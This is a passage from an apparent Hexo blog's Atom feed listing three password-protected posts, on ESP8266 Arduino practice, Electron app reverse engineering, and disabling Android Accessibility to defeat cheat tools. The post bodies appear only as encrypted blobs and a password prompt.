<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-07-30T07:36:11.600Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Arduino ESP8266开发板上手实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/</id>
    <published>2019-07-30T02:46:35.000Z</published>
    <updated>2019-07-30T07:36:11.600Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Password is ESP8266" />    <label for="pass">Password is ESP8266</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IOT/"/>
    
    
      <category term="Arduino" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Arduino/"/>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>Electron跨平台App实战分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/</id>
    <published>2019-07-29T03:59:49.000Z</published>
    <updated>2019-07-29T14:45:34.468Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1/LPkCbLoAMNTg+vmjGXMbuAI3wOv57nrxDNrCVhCFOASKLyNNQe4aJ3pGSIvJH7ZzHTVscA780jPwShlxF+1Yrz/84D3K+deIs8c+aG25AZbkIjl/U59vaMlEX40tIQfBEUU24+2/B6raHQmUgq/qvY/MVUJqRWdhXo1Vkv372cAvwT4ZS3WBq9NF3J6taaIWyWWI7ZsO+hV9Oqjxr8t5SfZa6e3Eve5xr6s0VgeOqq6VX1T41khotFkQYQKrXhCtCA+pfd4CE3qLtjGA8iMnZ5ZYQ3olxFhPe127oBjNt/LVKuNEoeqCfjaU1zc3PT524T3KpxR7PcH6AIgSvmxosrd4iM3KspjDPfeg82ONHcI35YryhKmyLbayGWa/pQEwW0sl9WxktiDOt/3ifpo/oj4RhzIxjK55ri8Wm1m7Ewwe+6c8vE4RP7swqfxV9C7aq055nbmaGACfkHgYSayQKWPJZG3tTpK2QQofTlXwXk2/E0BmsCjNGazF8x3LhWKvts2f11cI0iWCU0iz26e6K35OKPP5gqEz/hPU3fyqx0PVdMC2uxtAWLnRe1lUyfDtFflrKViv++NaPbCCNuzcNK8p74Lfp201982bR/76NTapvWqeCgIYj04gy6OwVao2hodraC/nfPslRkjKUuewTbNYQBBJ20xySHkgWMgHB6Mgv9VkoSMHkW2q6o/MrFZ7iOyexCuNLlbK056v+jFFLsWwK3ny4QOCAtslF7fMExMdd5FIwTiYjfVp6GA7ys+iCq1k37Rlx0uQ5pfiXCssnLnLauhQPQPHDp7mUmjes1PrTj3on4tF7nJf5+e6b0AimE+i0J/FQbSDC0pJvLm0paeCCQFqwIJTgvKhSEwmTibRp9kd6iA7U+VYyLeSlI9AtDKec3NMmtEBxkN7vnANdi7duxAYTBGxnGVP6P2dq7q7AbH4Ty59zah11v7lAjDnhRDeHS5cBUF/0Y2aX1Bp7o8iHI6RtoLfF8of3RozUMvcTH4uECofCi4dLA88GKDQJJsezxnVeMl//FHDbTnMbfAUzgDHL5cb2qhjaaIibuDkRe6x4redyrIyWAxPvZzuJ1l0l9uuP++V7FQ5ZaWDbfSYpmbVOh5XMDpg07vSRu+cAEw7aoZy5y3v6lZez/0DhiPzk1Xu8zhf1oVT/Q4t9ehuHx7c7ZRnP6Hpp5Cidow+kQPczaV4aml/gTS0bOTx7rBnhYPLCIiuR3yu8b2gDm7uvKQarK1vZ0Q+SFJ4ZhswG0pUfJd+/Iw0MGYoNnk0Qy92s59n2OqmbgxtJHFGGioQiYYyjb6pv2WglC2swELg8cpR7ayHYgtnxYt3Ae1PU4fnSkihtdD9VUjRPejNhL4ZIHTejmN67VET9uA/JcP8mjlUM0+rSA5jL7aaJwAjixq97mtuwnd06A7lLKyrQEIKC4mXS7cPHVbrbdZqCbaNNz7kmAHLEF5w/F6yxbewxkofiCRP/3X2MFzpLq49pGhq3iQXARqpOYtWWQ+ghQNTF5dyyzlxeqaqVK3WZfFmZRLAnsZv12hP6rOaHJJ7HMobwipLSuvld38jPVn9TKcPLEms3RVyI5OMEoXmeLaCqgy1F6HjX9j4mCRwyDhmkDEcrNk6XwkytkaE/k2C8Fi5jtQriMKJG0gBkUAtBqyGFnIPjngPBmos3APEPJvUgSDJEMi/N+Hz3M1fqZ4ITgaWbbaisflS26xMCcTwvfvdRjx0VhK1eExSEozXEHt1ELGQ8kcKxKFJOJH9yCuirxfKR5y0mVxKJQQYUfaPMFlHGA4Hd5JY6f/UUBW3f5I8FQ8oszoOfWS5qtv4/7cOhB1qnEkwmjlqhhgU5bKwo0rVps4cJ554vYiWlqTBnAQGt02goZIHGsmCjT6mVTTOJvu+gEv4igLRrr8RjoxGfoInffT659Lwmuc17FAG5M9pNC3ka9jUg1rp+Z+L1KDXqcJtP507husXcJjxzYjb2qCI/bef2IudoRfttq/U3N5gIpxbGTLjmTlr8Xk2KgjmQoz9eFxayzhj59mAk58pOfALUR+WOVu97Zp55YRfFH+L2REry24BEaNYkAfF6eRnMqRmuLCOxAi3vqbZpo9OUjTbkzH/B+2abDdNYE+s0ZRtSKLHUv4KmcKu3m7cbY6Vpmtfw5Pgp3A6fWTjCObPz+YqYp0t9C0joLljKBcnf5lnktLgAuZzFXyDhOyxRoFofIjKuOFBkKknjSbwc2y/O5wc5GiZQsPQqmMoMjttxreVogSNZBjbNojsw5HTC/isKjc8eUgiQ929lkt5tjk/wo1GAbXt1GUU+lCkfctbDL6paOj6TRUJyzKGpM0DdRvYEGwSFrA2NKadg7Iyhgq9YPxiTTyUc2r7+w+ErGXjNenxQDodNPPwrl0eT+z9bdOKd88HSESddpfZfZZH+CswK4S6Hg71DVZw8zDtyW8KgBq2oNRhaSk/9uunXeKzn710i+/EAYwCK43VrEr7b6Ft/IFXzu16hnBdvrGFUbM5cVkANnehGJdLq8qrUajM9L+sqbrm50o9gLpHQOotecVzdroPa2Qu1M6DN034u+odGcfFTOxLNneg9C97AGa5yCEOwXm7WSXqhe8FG24JhNUWs92Zcu12QBQXw2FuiF25tjgWN2YeTJPr8kXJgzzORyR8E3WDB1HIApIda8ZhT9s0K7vE5wECNK78gql7xcn6OQYECTcgo3qlB3+ccbS3yRCD7tHcujRCksX5quPrwpRQGjYb5EvP+pirJ0HlmFBn/B7o2wAiamhDIc2IMISrb0HdCOAbL2ExS+XmyemBkW3n39FH6V8F78qRSSx2VPzF3H2G6//VCu+Mhm9Pvt24lam6kE7G/7YlsRUj4ceAzZfHF2GHK+RCNZh88ClIH9Kn4jQIAS/peEe3/x4yjdeiDgpjvB+zUhgUH8sTSBenO1x7fgrWIHrAzvUqU9Ci+dp9Tq1XEKYAtW+g5P8guI13M3sYWH8ITEpkZhCNcq4yTtbojqsw6VgUNKwaHBazxo5Lnv6dZPnS37EB0lvTyy9ZjL2eGbBXWC1jRPmu9TeNlQ5ndkkpVuRagvusUbjaKdmDWEekfm7FMSv4TifogncYjgT9eO760t+mxim21jJIj3lZJymm9SVJ9w4JfUAMvp5aJOx+9aRnpeLATA+40QKhp/v3FTGbjkzicDgmE89UhWrNSiHdowdVYXa6I2oTt/TwiuNBOMcJ1fxn0UEURQ0W91MMTd3blzd9iLuhNAfRQENbhOrJBYDb0GstKay9PAjbVScv5AOAyzg7kJsv75l4anBxF/gJlB3gwvlkRfm0sb5fa9O15C2BStEHGu+vBkGWCAAH1jT8s/8mIRy4hRQusBFSnrhu72W3CeU1U+3YPy3DP79lkKlFmHXNGJ61ge9DvtENcb3vS4NkMbpbk0e0ACIRcdDY90YZ9RkyRq7kEmq6LnB6weoTqjZjLC7hQNvltcwB/gU8VVUlbK/8dcn7StLGOkecGY2dEM7WaCWACabBh43YMa2y5tAFZ34/vYaxM04YMbZwh7c+KwnzPx+PoVJqNy+X7yDHB6d3Bz7hiCsz1gwgMhZpe996EJJ0vvW0hnj9yecqQAncdv3uGZLXBPwiIwPAw3w3CXM1IJWQp8aKlgUusegifOt89LH8aJjeW6UTCQM9Se12G09ebYw5GO0r4FhQR3TolkUsNprWrsHrKv9JMOgL+6IFr/eypoHovUczz1KM87r3+u9Ezx+RvK72+sxPcwvhVsq5u4l5j9PidXK+QOUDaB75WG+dJzHD4Jdu/Cwll74F/dXdUJ8abe3g9aEsN/Y/4KFbF8FnGWgS/oSj8Qswg2YcoRVp5PS2oiCwdHMW965y17QKoVrDf5IAkRcWl3rh7NM/Cx61YU9L/XTzB/mJI/aYZdy3EBuUGbRG/9nRgWwyMWHXw9Kw99Ja8YB0FywAbYi4FOAE1PYiQ5gKMmp3DP2JLoj3ULPZTrtSUAwIsWnYuMzIwxdbaqaM6I1zdw1Igvp0PCfFkBhyApJ+NNdM27aKplc3c6+rFYyHXTaEZFNgrJcJBh38ZiIWMtBUQGVtKqPuGcQ1RPgJzNJDxzy66HOzU8h4BHIzM/rQ6AoNjyHWYAC5EEnXWHXXgnE4P6uDbOkMLPaL7pGakED7fNcfXaXOpvYjkUIQ2jiq6k3v+h9qa6p0QLuU6Fy2TOJqgUpxpRRvoXrFWgQU/npgCOqPQKuOOm2bQFJO9dWOMSiIfY+ofUX2tHbyAUgFijYJ5jdSvPnwWDinwes9WD1E2ZIdPTyeAoYWKzEvzmida+3Oamt6b1B3ONZLYP/Km3VqcOfLxsORgVMQstPnmgt2zP09zpSFRAnz0NRdI/KRPLFaN0Il3p5OoFAK6JL25hgq0437LD6YBk/BEF536ffSUuXQFKiGq1jS+xw9iC5gbLUtqghu+2VqvcInEPMXVUg1RuhXrOhvFxHd4ORaDVA011pK2UEfAOlzQ9R2JhEf9Ia9RRZ4G5IJgMDjIMcYBXOvx+nf5wO7Ahexm60qmwAXXjFDnWapSMIS3RcS/NL9vDCKY6F04hWBvTiVAzzM936hoGcbeUYm1WwYCvZTGcHn+w03PN4/faQ1eMPBAdYwVBczYLDSNpwg0ZC8m2tQzyTxWAeOvT/RqEICisUkQNJlyhZzSM41ceKyvlPkUDKD07OWrDnF1naeKV/JkAtwdtGNtTE0k5Q2JWlQSB9ywsdXnWamotn6iJ9hfTt9j54pVRPWQrJbALPEaEgKymeCabq6dkKu1ftHw5GqdZ6FyFVlkVn4piCAh8SXVIs6PVK2JXEVwckOaDWxR4klqMhATyBpE3lVDfCBbVzytr3EWZvzhLRtrXh4fnKaDD/MxLWvXABtDWkF1dwYP2mItCY2KdcLrqLZw5yr4X96lXX9Cgsu402aY+wL8gu9TZkNwgUX9nqngqkQHoUA0z3tJuiGHBy/zrQs7FD0gFKW6U/i/1K3JALNmVZrsIe8842MFLXL+KNJD0B8CB70Wi5eZCZ7DQb7gvHesWWvqXoZ2yigWZRkDcj+uhO1X+N7K3+e3nyRAB6zxotZvrly9nG0hHCP9X1TarjujYAJoQOjvbivGfyblDBbDxm41XLTAzD8/CYUbD9pRtsbtAXC1Nm9FoZ+lx66YjsdsOonOzFRtJ/zW5Y1FQW158NCJx+/eJG62XQ/U8ltlEiEJWTS3E0jSsC6La5991yHqzuQRT9H87h0WQ4YI6gbB1CnjkONGlrJPLq7Q1nKYWi6d3uUI1g0YSICUoBAeOomNaFMwIf8zXd6XJlO3Bky507gfaZlwRc/DSGk1ZVHXwCqEyh+soLHISca+4nufeEMqPB36ZMHa0bBf1ZXM2l3udaiYTEnOxMGZEuGe/4NivnPp0qrm6o7XMosoRXtSpuDX6QyBqL91ftgAeyxTWKnSiekTPsSlquIGDIqmOUkahVqaNxo1EV/0+GVj6ijtvT0tYuvUPjPJwpYYR2bV7fwMt69vnH6/ro5oO0SxObM6xDZVX0Yw/MuYgRGQmVGN4Q9naEk3</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Electron" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Electron/"/>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Android完全禁用Accessibility（通杀一切基于此的外挂）</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/</id>
    <published>2019-07-24T12:02:54.000Z</published>
    <updated>2019-07-30T07:52:20.330Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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